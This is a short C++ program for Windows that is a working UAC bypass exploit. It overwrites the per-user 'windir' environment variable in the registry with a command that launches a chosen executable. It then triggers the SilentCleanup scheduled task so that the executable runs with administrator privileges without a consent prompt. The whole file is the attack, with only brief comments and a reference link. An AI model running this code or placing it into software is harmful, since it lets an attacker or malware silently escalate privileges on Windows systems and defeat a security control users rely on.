#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

// see https://gist.github.com/adenkiewicz/fb85d000af8454bcf6db397d1acac487

#include <cstdlib>
int main(int argc, char** argv)
{
	// executable to run
	const char* target = "cmd.exe";
	if (argc == 2)
	{
		target = argv[1];
	}
	// command to execute
	char command[MAX_PATH + 11] = "cmd.exe /k start ";
	strcat(command, target);
	strcat(command, " && exit && ");
	// overwrite %windir% environment variable with the command
	HKEY hKeyEnv;
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_ALL_ACCESS, &hKeyEnv) == ERROR_SUCCESS)
	{
		if (RegSetKeyValueA(hKeyEnv, 0, "windir", REG_SZ, command, strlen(command) + 1) == ERROR_SUCCESS)
		{
			// schtasks.exe will execute the command with administrator privileges
			system("schtasks.exe /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I > nul");
		}
		RegCloseKey(hKeyEnv);
	}
	return 0;
}